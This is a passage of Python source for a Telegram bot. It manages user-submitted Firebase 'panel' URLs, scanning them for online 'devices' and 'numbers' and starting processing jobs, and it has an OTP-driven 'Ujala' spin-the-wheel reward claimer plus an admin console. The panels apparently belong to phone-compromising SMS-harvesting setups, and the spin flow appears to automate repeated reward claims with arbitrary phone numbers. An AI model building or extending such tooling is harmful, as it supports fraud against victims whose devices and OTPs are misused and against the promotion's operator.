            reply_markup=kb,
        )
        return
    with _state_lock:
        firebase_confirmations.pop(chat_id, None)
        firebase_states[chat_id] = {"step": "awaiting_url"}
    text = (
        f"📁 <b>ADD FIREBASE</b> (1 panel only)\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Send your <b>Firebase URL</b>:\n\n"
        f"Example:\n"
        f"<code>https://panel-name-default-rtdb.firebaseio.com</code>\n\n"
        f"🔍 First your URL is <b>checked</b> - you will see how many "
        f"<b>devices</b> and <b>numbers</b> it has.\n"
        f"✅ Only after you confirm is the panel saved.\n"
        f"🗑️ You can <b>delete it anytime</b> and add a new one.\n\n"
        f"❌ Send /cancel to abort.\n"
        f"{FOOTER}"
    )
    if message_id:
        safe_edit(chat_id, message_id, text, None)
    else:
        bot.send_message(chat_id, text, parse_mode="HTML")


def scan_firebases_and_present(chat_id, message_id):
    """
    Background thread: scan every 'pending' URL of the user, edit the same
    message with progress, then present the SELECT screen on that message.
    """
    rows = get_user_firebases(chat_id)
    pending = [r for r in rows if r["status"] == "pending"]
    total = len(pending)
    done = 0
    for r in pending:
        done += 1
        url = r["firebase_url"]
        try:
            panel = check_panel_active(url)
            if panel:
                update_firebase(
                    r["id"], status="scanned",
                    summary=(f"🖥️ {panel['total_devices']} devices | "
                             f"📱 {panel['total_numbers']} numbers"),
                )
            else:
                update_firebase(r["id"], status="error",
                                summary="❌ No online devices / scan failed")
        except Exception as e:
            logger.error("scan failed for %s: %s", url, e)
            update_firebase(r["id"], status="error",
                            summary="❌ Scan error (timeout?)")
        text = (
            f"🔍 <b>SCANNING FIREBASE</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📡 Progress: <b>{done}/{total}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📡 <code>{escape(url)}</code>\n"
            f"{FOOTER}"
        )
        progress_edit(chat_id, message_id, text)
        time.sleep(1)
    # Present the selection list (edits the very same message)
    send_firebase_selection(chat_id, message_id, edit=True)


def handle_add_firebase_text(chat_id, text):
    """
    Add flow: parse the URL, validate it, filter duplicates, then CHECK it
    (devices + numbers) in a background job. After the check, a
    confirmation with an "ADD" button is shown. Nothing is saved until the
    user confirms. Only ONE panel per user is allowed.
    """
    raw_urls = [line.strip() for line in (text or "").splitlines() if line.strip()]
    valid, invalid = [], []
    for raw in raw_urls:
        ok, res = is_valid_firebase_url(raw)
        if ok:
            valid.append(res)
        else:
            invalid.append((raw, res))

    if not valid:
        bot.send_message(
            chat_id,
            f"❌ <b>No valid Firebase URL found.</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            + ("\n".join(f"• {escape(a[:60])}: {b}" for a, b in invalid[:5]) if invalid
               else "Send a URL starting with <b>https://</b> containing "
                     "<b>firebaseio.com</b> or <b>firebasedatabase.app</b>") +
            f"\n\n👉 Try again, or send /cancel to abort.\n"
            f"{FOOTER}",
            parse_mode="HTML",
        )
        return

    # Filter URLs this user already added
    new_urls, dupes = [], []
    for url in valid:
        if is_duplicate_firebase(chat_id, url):
            dupes.append(url)
        else:
            new_urls.append(url)

    with _state_lock:
        firebase_states.pop(chat_id, None)

    if not new_urls:
        bot.send_message(
            chat_id,
            f"❌ <b>Nothing new to add.</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔁 Already added by you: <b>{len(dupes)}</b>\n"
            f"📂 This URL is already in your MY FIREBASE.\n"
            f"{FOOTER}",
            parse_mode="HTML",
        )
        return

    if get_firebase_count(chat_id) >= 1:
        kb = InlineKeyboardMarkup(row_width=1)
        kb.row(btn("📂 MY FIREBASE", callback_data="my_firebase"))
        bot.send_message(
            chat_id,
            f"❌ <b>You already have 1 Firebase panel.</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📂 Limit: <b>1 panel per user</b>.\n\n"
            f"👉 Delete the existing panel from <b>📂 MY FIREBASE</b> "
            f"first, then add a new one.\n"
            f"{FOOTER}",
            reply_markup=kb,
            parse_mode="HTML",
        )
        return

    if len(new_urls) > 1:
        extra_note = f"⚠️ You sent <b>{len(new_urls)}</b> URLs — only <b>1 panel</b> is allowed, so only the first one will be checked.\n"
    else:
        extra_note = ""

    # Store the confirmation until the user presses ✅ / ❌
    with _state_lock:
        firebase_confirmations[chat_id] = {
            "entries": [{"url": new_urls[0], "panel": None, "summary": None, "added": False}],
            "dupes": dupes,
            "_ts": time.time(),
        }

    try:
        msg = bot.send_message(
            chat_id,
            f"🔍 <b>CHECKING FIREBASE URL</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{extra_note}"
            f"Checking <code>{escape(new_urls[0])}</code> for online devices...\n"
            f"This takes a few seconds.\n"
            f"{FOOTER}",
            parse_mode="HTML",
        )
        mid = msg.message_id
    except Exception:
        mid = 0

    # Check (scan) the URL in the background - never blocks the bot
    _enqueue_job("check", (chat_id, mid))


def check_firebases_and_confirm(chat_id, message_id):
    """
    Background job: scan every pending URL of the confirmation, edit the
    same message with progress, then show the CONFIRMATION with device &
    number counts and per-URL ADD THIS buttons.
    """
    with _state_lock:
        conf = firebase_confirmations.get(chat_id)
    if not conf:
        return
    entries = list(conf.get("entries") or [])
    total = len(entries)
    done = 0
    for e in entries:
        done += 1
        url = e["url"]
        try:
            panel = check_panel_active(url)
        except Exception as exc:
            logger.error("pre-check failed for %s: %s", url, exc)
            panel = None
        if panel:
            e["panel"] = panel
            e["summary"] = (f"🖥️ {panel['total_devices']} devices | "
                            f"📱 {panel['total_numbers']} numbers")
        else:
            e["panel"] = None
            e["summary"] = "❌ No online devices / offline"
        text = (
            f"🔍 <b>CHECKING FIREBASE URL</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📡 Progress: <b>{done}/{total}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔗 <code>{escape(url)}</code>\n"
            f"📊 {e['summary']}\n"
            f"{FOOTER}"
        )
        progress_edit(chat_id, message_id, text)
        time.sleep(1)

    with _state_lock:
        cur = firebase_confirmations.get(chat_id)
        if cur is not None:
            cur["entries"] = entries
    send_firebase_confirmation(chat_id, message_id)


def send_firebase_confirmation(chat_id, message_id):
    """Show the confirmation with the device/number count + ADD button."""
    with _state_lock:
        conf = firebase_confirmations.get(chat_id)
    if not conf:
        return
    entries = conf.get("entries") or []
    remaining = [e for e in entries if not e.get("added")]
    remaining_count = len(remaining)

    lines = []
    for e in entries:
        short = _fb_short(e["url"])
        if e.get("added"):
            lines.append(f"✅ <code>{escape(short)}</code> — added ✔️")
        else:
            lines.append(f"{_STATUS_EMOJI.get('scanned', '📡')} <code>{escape(short)}</code> — {e.get('summary') or '⏳ checking...'}")

    dup_note = ""
    if conf.get("dupes"):
        dup_note = f"🔁 Skipped (already added by you): <b>{len(conf['dupes'])}</b>\n"

    kb = InlineKeyboardMarkup(row_width=1)
    for idx, e in enumerate(entries):
        if e.get("added"):
            continue
        short = _fb_short(e["url"])
        kb.row(btn(f"✅ ADD THIS — {short}", callback_data=f"fb_add_one_{idx}"))
    if remaining_count > 0:
        kb.row(btn("✅ ADD PANEL", callback_data="fb_add_confirm"))
    kb.row(btn("❌ CANCEL", callback_data="fb_add_cancel"))

    body = (
        f"📁 <b>CONFIRM ADDING FIREBASE</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🧾 To add: <b>{remaining_count}</b> panel (max 1)\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{chr(10).join(lines)}\n"
        f"{dup_note}"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Tap <b>✅ ADD THIS</b> to save it.\n"
        f"🗑️ You can <b>delete it anytime</b> from 📂 MY FIREBASE and add "
        f"a new one.\n"
        f"{FOOTER}"
    )
    progress_edit(chat_id, message_id, body, kb)


def confirm_firebase_add(chat_id, message_id):
    """
    User pressed ADD PANEL: insert the remaining entry (already checked),
    then show the SELECT screen immediately.
    """
    with _state_lock:
        conf = firebase_confirmations.pop(chat_id, None)
    if not conf:
        bot.send_message(chat_id,
                         "❌ No pending Firebase confirmation found. "
                         "Please start over with 📁 ADD FIREBASE.")
        return
    entries = [e for e in (conf.get("entries") or []) if not e.get("added")]

    if get_firebase_count(chat_id) >= 1:
        kb = InlineKeyboardMarkup(row_width=1)
        kb.row(btn("📂 MY FIREBASE", callback_data="my_firebase"))
        bot.send_message(
            chat_id,
            f"❌ <b>You already have 1 Firebase panel.</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Delete the existing panel from 📂 MY FIREBASE first.\n"
            f"{FOOTER}",
            reply_markup=kb,
            parse_mode="HTML",
        )
        return

    # Insert rows (status scanned - already checked)
    added = 0
    failed = []
    for e in entries:
        if is_duplicate_firebase(chat_id, e["url"]):
            continue  # safety race: skip
        summary = e.get("summary") or "📡 Scanned"
        if add_firebase(chat_id, e["url"], status="scanned", summary=summary):
            added += 1
        else:
            failed.append(e["url"])

    if added == 0:
        bot.send_message(
            chat_id,
            f"❌ <b>Could not add any URL.</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Maybe it was already added moments ago.\n"
            f"{FOOTER}",
            parse_mode="HTML",
        )
        return

    notes = []
    if conf.get("dupes"):
        notes.append(f"🔁 Skipped (already added): <b>{len(conf['dupes'])}</b>")
    if failed:
        notes.append(f"⚠️ Failed to insert: <b>{len(failed)}</b>")
    note_text = "\n".join(notes) + ("\n" if notes else "")

    try:
        msg = bot.send_message(
            chat_id,
            f"✅ <b>Added 1 Firebase panel</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{note_text}"
            f"🎯 The panel is already checked - select it to process!\n"
            f"🗑️ You can delete it anytime from 📂 MY FIREBASE.\n"
            f"{FOOTER}",
            parse_mode="HTML",
        )
        mid = msg.message_id
    except Exception:
        mid = 0

    # Panels are already checked -> present the SELECT screen directly
    send_firebase_selection(chat_id, mid, edit=True)


def confirm_firebase_add_one(chat_id, message_id, idx, call=None):
    """
    User tapped ADD THIS on the URL: insert that one panel (already
    checked) and refresh the confirmation message. When the last URL is
    added, show the SELECT screen.
    """
    with _state_lock:
        conf = firebase_confirmations.get(chat_id)
        entry = None
        if conf and 0 <= idx < len(conf.get("entries") or []):
            entry = conf["entries"][idx]
    if not entry:
        if call:
            bot.answer_callback_query(call.id,
                                      "❌ Confirmation expired. Start over.",
                                      show_alert=True)
        return
    if entry.get("added"):
        if call:
            bot.answer_callback_query(call.id, "✅ Already added.",
                                      show_alert=True)
        return
    if is_duplicate_firebase(chat_id, entry["url"]):
        entry["added"] = True
        if call:
            bot.answer_callback_query(call.id, "🔁 Already in your list.",
                                      show_alert=True)
        send_firebase_confirmation(chat_id, message_id)
        return

    if get_firebase_count(chat_id) >= 1:
        if call:
            bot.answer_callback_query(call.id,
                                      "❌ You already have 1 panel. Delete it first.",
                                      show_alert=True)
        return

    summary = entry.get("summary") or "📡 Scanned"
    fb_id = add_firebase(chat_id, entry["url"], status="scanned", summary=summary)
    if not fb_id:
        if call:
            bot.answer_callback_query(call.id, "❌ Failed to add.",
                                      show_alert=True)
        return
    entry["added"] = True
    if call:
        bot.answer_callback_query(call.id, "✅ Added!", show_alert=False)

    with _state_lock:
        cur = firebase_confirmations.get(chat_id)
        remaining = [e for e in (cur.get("entries") or []) if not e.get("added")] if cur else []
    if remaining:
        send_firebase_confirmation(chat_id, message_id)
    else:
        with _state_lock:
            firebase_confirmations.pop(chat_id, None)
        send_firebase_selection(chat_id, None, edit=False)


def cancel_firebase_add(chat_id):
    """User cancelled the addition - nothing is added or charged."""
    with _state_lock:
        firebase_confirmations.pop(chat_id, None)


def confirm_user_delete_firebase(chat_id, message_id, fb_id):
    """Ask the user to confirm deleting their own Firebase entry."""
    fb = get_firebase_by_id(fb_id)
    if not fb or fb["user_id"] != chat_id:
        return
    kb = InlineKeyboardMarkup(row_width=2)
    kb.row(btn("🗑️ YES, DELETE", callback_data=f"fb_my_del_yes_{fb_id}"))
    kb.row(btn("❌ CANCEL", callback_data="my_firebase"))
    safe_edit(
        chat_id,
        message_id,
        f"🗑️ <b>Confirm deleting your panel?</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<code>{escape(fb['firebase_url'])}</code>\n\n"
        f"⚠️ After deleting you can add a <b>new panel</b> anytime "
        f"(max 1 per user).\n"
        f"{FOOTER}",
        kb,
    )


def user_delete_firebase(chat_id, message_id, fb_id, call):
    """Actually delete the user's own Firebase entry."""
    fb = get_firebase_by_id(fb_id)
    if not fb or fb["user_id"] != chat_id:
        bot.answer_callback_query(call.id, "❌ Entry not found.", show_alert=True)
        return
    if delete_firebase(fb_id):
        bot.answer_callback_query(call.id, "✅ Deleted! You can add a new one.",
                                  show_alert=True)
        try:
            bot.send_message(
                chat_id,
                f"🗑️ <b>Panel deleted</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"<code>{escape(fb['firebase_url'])}</code>\n\n"
                f"📁 You can now add a <b>new panel</b> with 📁 ADD FIREBASE "
                f"(max 1).\n"
                f"{FOOTER}",
                parse_mode="HTML",
            )
        except Exception:
            pass
        send_my_firebase(chat_id, None, edit=False)
    else:
        bot.answer_callback_query(call.id, "❌ Delete failed.", show_alert=True)


def select_firebase(chat_id, message_id, fb_id, call):
    """
    Handle a SELECT tap: marks the panel as selected and launches the full
    processing job editing the current message.
    """
    fb = get_firebase_by_id(fb_id)
    if not fb or fb["user_id"] != chat_id:
        bot.answer_callback_query(call.id, "❌ Panel not found.", show_alert=True)
        return
    existing = get_selected_firebase(chat_id)
    if existing and existing["id"] != fb_id:
        bot.answer_callback_query(
            call.id,
            "You already have a selected panel. Delete it first if you want "
            "to select another one.",
            show_alert=True,
        )
        return
    if fb["status"] == "processing":
        bot.answer_callback_query(call.id, "🔄 This panel is already processing.",
                                  show_alert=True)
        return
    if has_active_processing(chat_id):
        bot.answer_callback_query(
            call.id,
            "⏳ Another panel of yours is already processing.\n"
            "Wait for it to finish first.",
            show_alert=True,
        )
        return
    set_firebase_selected(fb_id, chat_id)
    ok = start_firebase_processing(fb_id, chat_id, message_id)
    if not ok:
        bot.answer_callback_query(
            call.id,
            "⏳ You already have a job in the queue.\n"
            "Wait for it to finish first.",
            show_alert=True,
        )
        return
    bot.answer_callback_query(call.id, "✅ Panel selected & processing started!")


# ─────────────────────────── SPIN FLOW ───────────────────────────

def start_spin(chat_id, message_id=None):
    """Entry point of the spin flow (called from the SPIN NOW button)."""
    user = get_user(chat_id)
    if not user:
        return
    if user.get("banned"):
        bot.send_message(chat_id, "⛔ You are banned from using this bot.")
        return
    with _state_lock:
        if chat_id in spin_sessions:
            bot.send_message(chat_id,
                             "⚠️ A spin is already in progress.\n"
                             "Finish it or send /cancel to abort.")
            return
        spin_sessions[chat_id] = {"step": "phone", "_ts": time.time()}
    text = (
        f"🎡 <b>UJALA THE WHEEL</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 Please send your <b>10 digit mobile number</b>.\n"
        f"(No country code needed)\n\n"
        f"Example: <code>9876543210</code>\n\n"
        f"❌ Send /cancel to abort.\n"
        f"{FOOTER}"
    )
    if message_id:
        safe_edit(chat_id, message_id, text, None)
    else:
        bot.send_message(chat_id, text, parse_mode="HTML")


def handle_spin_phone(chat_id, text):
    """Validate the phone number and request an OTP from the API."""
    if not (text.isdigit() and len(text) == 10):
        bot.send_message(chat_id,
                         "❌ Invalid number. Please send exactly <b>10 digits</b>.\n"
                         "Send /cancel to abort.")
        return
    user = get_user(chat_id)
    if not user:
        return
    bot.send_message(chat_id, "⏳ Contacting Ujala server...")
    user_key, data_key = api_create_user()
    if not user_key or not data_key:
        with _state_lock:
            spin_sessions.pop(chat_id, None)
        bot.send_message(chat_id,
                         "❌ Server error: could not create session.\n"
                         "Please try again later.\n"
                         f"{FOOTER}")
        return
    name = (user.get("first_name") or "User")[:30]
    if not send_otp(user_key, data_key, name, text, PRODUCT_CODE):
        with _state_lock:
            spin_sessions.pop(chat_id, None)
        bot.send_message(chat_id,
                         "❌ Could not send OTP. This number may already be "
                         "registered, or the server is busy.\n"
                         "Please try again later.\n"
                         f"{FOOTER}")
        return
    with _state_lock:
        spin_sessions[chat_id] = {
            "step": "otp",
            "user_key": user_key,
            "data_key": data_key,
            "phone": text,
            "_ts": time.time(),
        }
    bot.send_message(
        chat_id,
        f"✅ OTP sent to <b>{mask_phone(text)}</b>!\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 Please enter the <b>6 digit OTP</b> you received.\n\n"
        f"❌ Send /cancel to abort.\n"
        f"{FOOTER}",
    )


def handle_spin_otp(chat_id, text):
    """Verify OTP, spin the wheel, claim the reward, record history (FREE)."""
    with _state_lock:
        state = spin_sessions.get(chat_id)
    if not state:
        return
    if not (text.isdigit() and len(text) == 6):
        bot.send_message(chat_id,
                         "❌ Invalid OTP format. Please send the <b>6 digit</b> code.\n"
                         "Send /cancel to abort.")
        return
    user_key, data_key, phone = state["user_key"], state["data_key"], state["phone"]
    bot.send_message(chat_id, "🔑 Verifying OTP...")
    token = verify_otp(user_key, data_key, text)
    if not token:
        # Keep the state so the user can retry the correct OTP
        bot.send_message(chat_id,
                         "❌ Invalid OTP or verification failed.\n"
                         "Please check the code and try again.\n"
                         "Send /cancel to abort.")
        return
    bot.send_message(chat_id, "🎡 Spinning the wheel...")
    reward = spin_wheel(user_key, data_key, token)
    if not reward:
        with _state_lock:
            spin_sessions.pop(chat_id, None)
        bot.send_message(chat_id,
                         "❌ Spin failed (server error).\n"
                         "Please try again later.\n"
                         f"{FOOTER}")
        return
    bot.send_message(chat_id, "💰 Claiming your reward...")
    claimed = claim_reward(user_key, data_key, token)
    if not claimed:
        with _state_lock:
            spin_sessions.pop(chat_id, None)
        bot.send_message(chat_id,
                         f"⚠️ You won <b>{escape(reward)}</b> but the claim "
                         f"request failed.\nPlease contact support or try "
                         f"again later.\n"
                         f"{FOOTER}")
        return
    # Success: record history (spin is completely FREE)
    record_spin(chat_id, phone, reward)
    with _state_lock:
        spin_sessions.pop(chat_id, None)
    kb = InlineKeyboardMarkup()
    kb.row(btn("🎡 SPIN AGAIN", callback_data="spin_now"))
    kb.row(btn("🔙 MAIN MENU", callback_data="main_menu"))
    bot.send_message(
        chat_id,
        f"🎉 <b>CONGRATULATIONS!</b> 🎉\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎁 You won: <b>{escape(reward)}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Spin again — it's completely free!\n"
        f"{FOOTER}",
        reply_markup=kb,
    )


# ════════════════════════════════════════════════════════════════════════════
# 12. ADMIN PANEL
# ════════════════════════════════════════════════════════════════════════════

def admin_menu_text():
    return (
        f"👑 <b>ADMIN PANEL</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 Stats — bot statistics\n"
        f"👥 Users — manage users\n"
        f"📢 Broadcast — send message to all\n"
        f"📈 Analytics — detailed breakdown\n"
        f"🔥 Firebase — manage all panels\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Use the buttons below.\n"
        f"{FOOTER}"
    )


def admin_menu_keyboard():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.row(btn("📊 STATS", callback_data="admin_stats"),
           btn("👥 USERS", callback_data="admin_users"))
    kb.row(btn("📢 BROADCAST", callback_data="admin_broadcast"),
           btn("📈 ANALYTICS", callback_data="admin_analytics"))
    kb.row(btn("🔥 MANAGE FIREBASE", callback_data="admin_firebases"))
    kb.row(btn("🔙 USER MENU", callback_data="main_menu"))
    return kb


def send_admin_menu(chat_id, message_id=None, edit=True):
    if edit and message_id:
        safe_edit(chat_id, message_id, admin_menu_text(), admin_menu_keyboard())
    else:
        bot.send_message(chat_id, admin_menu_text(),
                         reply_markup=admin_menu_keyboard(), parse_mode="HTML")


def send_admin_stats(chat_id, message_id=None, edit=True):
    s = get_stats()
    text = (
        f"📊 <b>STATS</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 Total users: <b>{s['total_users']}</b>\n"
        f"🆕 Joined today: <b>{s['joined_today']}</b>\n"
        f"📢 Channel joined: <b>{s['channel_joined']}</b>\n"
        f"⛔ Banned: <b>{s['banned']}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔥 Firebase URLs added: <b>{s['total_firebases']}</b>\n"
        f"🎡 Total spins: <b>{s['total_spins']}</b>\n"
        f"🎡 Spins today: <b>{s['spins_today']}</b>\n"
        f"{FOOTER}"
    )
    markup = back_markup("admin_panel")
    if edit and message_id:
        safe_edit(chat_id, message_id, text, markup)
    else:
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")


def send_admin_analytics(chat_id, message_id=None, edit=True):
    a = get_analytics()
    text = (
        f"📈 <b>ANALYTICS</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 Total users: <b>{a['total_users']}</b>\n"
        f"🎡 Total spins: <b>{a['total_spins']}</b>\n"
        f"🪙 Active spinners: <b>{a['spinners']}</b>\n"
        f"🎡 Spins today: <b>{a['spins_today']}</b>\n"
        f"🔥 Firebase panels: <b>{a['total_firebases']}</b>\n"
        f"{FOOTER}"
    )
    markup = back_markup("admin_panel")
    if edit and message_id:
        safe_edit(chat_id, message_id, text, markup)
    else:
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")


def send_admin_users(chat_id, message_id=None, page=0, edit=True):
    users = get_all_users()
    total_pages = max(1, (len(users) + PAGE_SIZE - 1) // PAGE_SIZE)
    page = max(0, min(page, total_pages - 1))
    start = page * PAGE_SIZE
    end = min(start + PAGE_SIZE, len(users))
    kb = InlineKeyboardMarkup(row_width=1)
    for u in users[start:end]:
        name = escape((u.get("first_name") or u.get("username") or f"User_{u['user_id']}")[:24])
        badge = " ⛔" if u.get("banned") else ""
        kb.row(btn(f"👤 {name}{badge}",
                   callback_data=f"admin_view_user_{u['user_id']}"))
    nav = []
    if page > 0:
        nav.append(btn("⬅️ PREV", callback_data=f"admin_users_page_{page - 1}"))
    if end < len(users):
        nav.append(btn("NEXT ➡️", callback_data=f"admin_users_page_{page + 1}"))
    if nav:
        kb.row(*nav)
    kb.row(btn("🔙 ADMIN MENU", callback_data="admin_panel"))
    text = (
        f"👥 <b>USERS</b> — page {page + 1}/{total_pages}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Tap a user for details.\n"
        f"{FOOTER}"
    )
    if edit and message_id:
        safe_edit(chat_id, message_id, text, kb)
    else:
        bot.send_message(chat_id, text, reply_markup=kb, parse_mode="HTML")


def send_admin_user_detail(chat_id, message_id, target_id):
    u = get_user(target_id)
    if not u:
        safe_edit(chat_id, message_id, "❌ User not found.", None)
        return
    spin_count = get_spin_count(target_id)
    fb_count = get_firebase_count(target_id)
    selected = get_selected_firebase(target_id)
    selected_txt = (
        f"🔒 <code>{escape(selected['firebase_url'])}</code>"
        if selected else "❌ None"
    )
    text = (
        f"👤 <b>USER DETAIL</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 ID: <code>{target_id}</code>\n"
        f"👤 Name: <b>{escape(u.get('first_name') or 'N/A')}</b>\n"
        f"📛 Username: @{escape(u.get('username') or 'N/A')}\n"
        f"📅 Joined: {u.get('registered_at') or 'N/A'}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📁 Firebase panels: <b>{fb_count}</b> (max 1)\n"
        f"🔒 Selected panel: {selected_txt}\n"
        f"🎡 Spins: <b>{spin_count}</b>\n"
        f"🎰 Last spin: {u.get('last_spin') or 'Never'}\n"
        f"⛔ Banned: {'YES' if u.get('banned') else 'No'}\n"
        f"{FOOTER}"
    )
    kb = InlineKeyboardMarkup(row_width=2)
    kb.row(btn("🎡 SPIN HISTORY", callback_data=f"admin_spins_{target_id}"),
           btn("📁 FIREBASE", callback_data=f"admin_fb_user_{target_id}"))
    kb.row(btn("⛔ BAN/UNBAN", callback_data=f"admin_ban_{target_id}"))
    kb.row(btn("🔙 USERS", callback_data="admin_users"))
    safe_edit(chat_id, message_id, text, kb)


def send_admin_user_spins(chat_id, message_id, target_id):
    history = get_spin_history(target_id)
    if not history:
        body = (f"🎡 <b>SPIN HISTORY</b> for <code>{target_id}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"❌ No spins yet.\n"
                f"{FOOTER}")
    else:
        lines = "\n".join(
            f"• {mask_phone(h['phone'])} — 🎁 {escape(h['reward'])} ⏰ {h['spin_time']}"
            for h in history
        )
        body = (
            f"🎡 <b>SPIN HISTORY</b> for <code>{target_id}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{lines}\n"
            f"{FOOTER}"
        )
    kb = back_markup(f"admin_view_user_{target_id}")
    safe_edit(chat_id, message_id, body, kb)


# ─────────────────────────── ADMIN: MANAGE FIREBASE ───────────────────────────

def _fb_status_badge(status):
    """Emoji badge for a firebase status."""
    return f"{_STATUS_EMOJI.get(status, '⏳')} <b>{status.upper()}</b>"


def send_admin_firebases(chat_id, message_id=None, page=0, edit=True):
    """List all Firebase URLs across all users (admin VIEW only), paginated."""
    rows = get_all_firebases()
    total_pages = max(1, (len(rows) + PAGE_SIZE - 1) // PAGE_SIZE)
    page = max(0, min(page, total_pages - 1))
    start = page * PAGE_SIZE
    end = min(start + PAGE_SIZE, len(rows))
    kb = InlineKeyboardMarkup(row_width=1)
    for r in rows[start:end]:
        short = _fb_short(r["firebase_url"])
        emoji = _STATUS_EMOJI.get(r["status"], "⏳")
        kb.row(btn(
            f"{emoji} {short} | user {r['user_id']}",
            callback_data=f"admin_fb_view_{r['id']}"))
    nav = []
    if page > 0:
        nav.append(btn("⬅️ PREV", callback_data=f"admin_fb_page_{page - 1}"))
    if end < len(rows):
        nav.append(btn("NEXT ➡️", callback_data=f"admin_fb_page_{page + 1}"))
    if nav:
        kb.row(*nav)
    kb.row(btn("🔙 ADMIN MENU", callback_data="admin_panel"))
    text = (
        f"🔥 <b>MANAGE FIREBASE</b> — page {page + 1}/{total_pages}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Total URLs: <b>{len(rows)}</b>\n"
        f"Tap an entry to view its details.\n"
        f"(Admins can view & delete all; users can delete their own.)\n"
        f"{FOOTER}"
    )
    if edit and message_id:
        safe_edit(chat_id, message_id, text, kb)
    else:
        bot.send_message(chat_id, text, reply_markup=kb, parse_mode="HTML")


def send_admin_firebase_detail(chat_id, message_id, fb_id):
    """Detail view of one Firebase entry (admin, view-only)."""
    r = get_firebase_by_id(fb_id)
    if not r:
        safe_edit(chat_id, message_id, "❌ Firebase entry not found.", None)
        return
    owner = get_user(r["user_id"])
    owner_name = "Unknown"
    if owner:
        owner_name = escape(owner.get("first_name") or f"User_{r['user_id']}")
    text = (
        f"🔥 <b>FIREBASE DETAIL</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔗 <code>{escape(r['firebase_url'])}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 Entry ID: <code>{r['id']}</code>\n"
        f"👤 Owner: <b>{owner_name}</b> (<code>{r['user_id']}</code>)\n"
        f"📅 Added: {r['added_at']}\n"
        f"📊 Status: {_fb_status_badge(r['status'])}\n"
        f"🕒 Last processed: {r['last_processed'] or 'Never'}\n"
        f"🛰️ Monitor active: {'YES' if r.get('monitor_active') else 'No'}\n"
        f"📋 Summary:\n{escape(r['summary'] or '—')}\n"
        f"{FOOTER}"
    )
    kb = InlineKeyboardMarkup(row_width=2)
    kb.row(btn("👤 OPEN OWNER", callback_data=f"admin_view_user_{r['user_id']}"))
    kb.row(btn("🗑️ DELETE ENTRY", callback_data=f"admin_fb_del_{r['id']}"))
    kb.row(btn("🔙 ALL FIREBASE", callback_data="admin_firebases"))
    safe_edit(chat_id, message_id, text, kb)


def confirm_admin_delete_firebase(chat_id, message_id, fb_id):
    """Ask the admin to confirm deleting one Firebase entry."""
    r = get_firebase_by_id(fb_id)
    if not r:
        safe_edit(chat_id, message_id, "❌ Firebase entry not found.", None)
        return
    kb = InlineKeyboardMarkup(row_width=2)
    kb.row(btn("🗑️ YES, DELETE", callback_data=f"admin_fb_del_yes_{fb_id}"))
    kb.row(btn("❌ CANCEL", callback_data=f"admin_fb_view_{fb_id}"))
    safe_edit(
        chat_id,
        message_id,
        f"🗑️ <b>Confirm deletion?</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<code>{escape(r['firebase_url'])}</code>\n\n"
        f"👤 Owner: <code>{r['user_id']}</code>\n"
        f"⚠️ This removes the panel from the owner's account "
        f"(they will be notified).\n"
        f"{FOOTER}",
        kb,
    )


def admin_delete_firebase(chat_id, message_id, fb_id, call):
    """Actually delete the Firebase entry (admin), notify the owner."""
    r = get_firebase_by_id(fb_id)
    if not r:
        bot.answer_callback_query(call.id, "❌ Entry not found.", show_alert=True)
        return
    owner_id = r["user_id"]
    if delete_firebase(fb_id):
        try:
            bot.send_message(
                owner_id,
                f"🗑️ <b>Your Firebase panel was deleted by the admin</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"<code>{escape(r['firebase_url'])}</code>\n\n"
                f"Your panel has been removed from your account.\n"
                f"{FOOTER}",
            )
        except Exception:
            pass
